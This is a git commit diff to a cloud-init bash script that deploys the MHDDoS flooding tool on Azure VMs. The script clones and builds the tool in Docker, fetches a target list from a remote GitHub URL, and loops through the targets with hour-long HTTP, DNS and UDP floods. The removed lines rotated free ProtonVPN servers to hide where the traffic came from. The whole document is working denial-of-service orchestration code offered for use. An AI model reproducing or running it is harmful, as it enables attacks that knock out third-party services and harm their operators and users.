7b8050b2f57cd2814853c3e80f8944a7eb4e10b7
Tom Fabler <imagination.fault@gmail.com>
2022-03-10 23:59:47 +0200

    mhddos in docker container

--- include/cloud-init-mhddos.sh
+++ include/cloud-init-mhddos.sh
@@ -2,11 +2,9 @@ echo '#!/usr/bin/env bash
 
 
 # BEGIN VARS
-MHDDOS_PATH="/home/azureuser/MHDDoS/start.py"
 TIME_EACH="3600"  # duration for each target in seconds
 PID_PATH="/home/azureuser/n.pid"
 LOG_DIR="/home/azureuser/log"
-TARGETS_PATH="/home/azureuser/targets"
 LOG_PATH="$LOG_DIR/nukem.log"  # nukem run log path
 LOG_RETENTION=10            # how many logs to keep
 BACKUP_SUFFIX=$(date +"%F_%H%M") # log retention suffix
@@ -14,32 +12,6 @@ BACKUP_SUFFIX=$(date +"%F_%H%M") # log retention suffix
 # NUKEM
 TARG_URL="curl https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt"
 
-# yes, Im still relying on this for free tier and server switching via cli
-PROTONVPN_PATH="$(which protonvpn-cli)"
-PROTONVPN_SERVERS=("JP-FREE#1"
-    "JP-FREE#2"
-    "JP-FREE#3"
-    "JP-FREE#4"
-    "NL-FREE#2"
-    "NL-FREE#1"
-    "NL-FREE#3"
-    "NL-FREE#4"
-    "NL-FREE#5"
-    "NL-FREE#6"
-    "NL-FREE#7"
-    "NL-FREE#8"
-    "NL-FREE#9"
-    "NL-FREE#10"
-    "NL-FREE#11"
-    "US-FREE#2"
-    "US-FREE#1"
-    "US-FREE#3"
-    "US-FREE#5"
-    "US-FREE#4"
-    "US-FREE#6"
-    "US-FREE#7"
-    "US-FREE#8"
-    "US-FREE#9")
 # END VARS
 
 
@@ -59,29 +31,6 @@ rotate_file () {
             rm -v $f | tee -a $LOG_PATH
         fi
     done
-}
-
-# switch protonvpn server
-switch_server_pvpn() {
-        iteration="$1"
-        pvpn_srv_num="${#PROTONVPN_SERVERS[@]}"
-        if [ $iteration -lt $pvpn_srv_num ]; then
-                srv_num=iteration
-        else
-                srv_num=$(($iteration % $pvpn_srv_num))
-        fi
-        echo "$(date +"%F %H:%M:%S:%s") INFO: disconnecting protonvpn from current server" | tee -a $LOG_PATH
-        $PROTONVPN_PATH d | tee -a $LOG_PATH
-        # sleep before re-attempting
-        sleep 5s
-        echo "$(date +"%F %H:%M:%S:%s") INFO: connecting protonvpn to ${PROTONVPN_SERVERS[$srv_num]}" | tee -a $LOG_PATH
-        $PROTONVPN_PATH c ${PROTONVPN_SERVERS[$srv_num]}
-        pstatus="$($PROTONVPN_PATH s)"
-        if [ -n "$( echo $pstatus | grep -w "No active ProtonVPN connection.")" ]; then
-            echo "$(date +"%F %H:%M:%S:%s") ERROR: protonvpn connection to ${PROTONVPN_SERVERS[$srv_num]} FAILED! TERMINATING IMMEDIATELY!" | tee -a $LOG_PATH
-            kill_stale
-            exit 1
-        fi
 }
 
 # kill stale containers
@@ -109,37 +58,36 @@ if [ -f "$PID_PATH" ] && [ -n "$(cat $PID_PATH)" ]; then
 fi
 echo "$$" > $PID_PATH
 kill_stale
-rotate_file "${LOG_PATH}" $LOG_RETENTION "logs"
-echo -e "==== START $(date +"%F %H:%M") ====\n" | tee -a $LOG_PATH
-echo -e "$(date +"%F %H:%M") DEBUG: TIME_EACH=${TIME_EACH}s" | tee -a $LOG_PATH
+run=1
 
 while :; do
+    rotate_file "${LOG_PATH}" $LOG_RETENTION "logs"
+    echo -e "==== START $(date +"%F %H:%M") ====\n" | tee -a $LOG_PATH
+    echo -e "$(date +"%F %H:%M") DEBUG: TIME_EACH=${TIME_EACH}s" | tee -a $LOG_PATH
     echo -e "$(date +"%F %H:%M") INFO: BEGIN RUN $run" | tee -a $LOG_PATH
     echo -e "$(date +"%F %H:%M") INFO: RE-READ TARGETS" | tee -a $LOG_PATH
     TARGETS=()
-    if [ -f "$TARGETS_PATH" ]; then
-      for t in $(cat "$TARGETS_PATH"); do TARGETS+=("$t"); done
-    else
-      for t in $(curl $TARG_URL); do TARGETS+=("$t"); done
-    fi
+    for t in $(curl $TARG_URL); do TARGETS+=("$t"); done
     NUM_TARGETS=${#TARGETS[@]}
     echo -e "$(date +"%F %H:%M") DEBUG: NUM_TARGETS=$NUM_TARGETS" | tee -a $LOG_PATH
     echo -e "\\n$(date +"%F %H:%M") ==== BEGIN TARGETS LIST ====" | tee -a $LOG_PATH
     for t in ${TARGETS[@]}; do echo $t | tee -a $LOG_PATH; done
     echo -e "$(date +"%F %H:%M") ==== END TARGETS LIST ====\\n" | tee -a $LOG_PATH
     # switch protonvpn server if protonvpn-cli is available
-    if [ -n "$PROTONVPN_PATH" ]; then switch_server_pvpn $(($run-1)); fi
     for ran_targ in $(shuf -i 0-$(($NUM_TARGETS-1))); do
         echo -e "$(date +"%F %H:%M") INFO: RUN $run TARGET ${TARGETS[$ran_targ]}" | tee -a $LOG_PATH
         if [ -n "$(echo ${TARGETS[$ran_targ]} | grep http)" ]; then
-                python3 $MHDDOS_PATH DGB ${TARGETS[$ran_targ]} 4 1000 proxies.txt 61 $TIME_EACH | tee -a $LOG_PATH
+                docker run -d --rm local/mhddos DGB ${TARGETS[$ran_targ]} 4 1000 proxies.txt 61 $TIME_EACH | tee -a $LOG_PATH
         elif [ -n "$(echo ${TARGETS[$ran_targ]} | grep -w "53" )" ]; then
-                python3 $MHDDOS_PATH DNS ${TARGETS[$ran_targ]} 1000 $TIME_EACH | tee -a $LOG_PATH
+                docker run -d --rm local/mhddos DNS ${TARGETS[$ran_targ]} 1000 $TIME_EACH | tee -a $LOG_PATH
         else
-                python3 $MHDDOS_PATH UDP ${TARGETS[$ran_targ]} 1000 $TIME_EACH | tee -a $LOG_PATH
+                docker run -d --rm local/mhddos UDP ${TARGETS[$ran_targ]} 1000 $TIME_EACH | tee -a $LOG_PATH
         fi
+        sleep ${TIME_EACH}s
+        kill_stale
     done
     echo -e "$(date +"%F %H:%M") INFO: END RUN $run" | tee -a $LOG_PATH
+    run=$(($run+1))
 done' > /home/azureuser/test_workload.sh
 
 chmod +x /home/azureuser/test_workload.sh
--- include/mhddos-deps.sh
+++ include/mhddos-deps.sh
@@ -1,5 +1,12 @@
+snap install docker
+groupadd docker
+usermod -aG docker azureuser
+sleep 10s
+docker ps
+sleep 5s
+chown root:docker /var/run/docker*
 apt-get update
 apt-get install -y python3-pip
 git clone https://github.com/MHProDev/MHDDoS.git /home/azureuser/MHDDoS
-pip install -r /home/azureuser/MHDDoS/requirements.txt
+docker build -t local/mhddos /home/azureuser/MHDDoS
 ulimit -n 100000
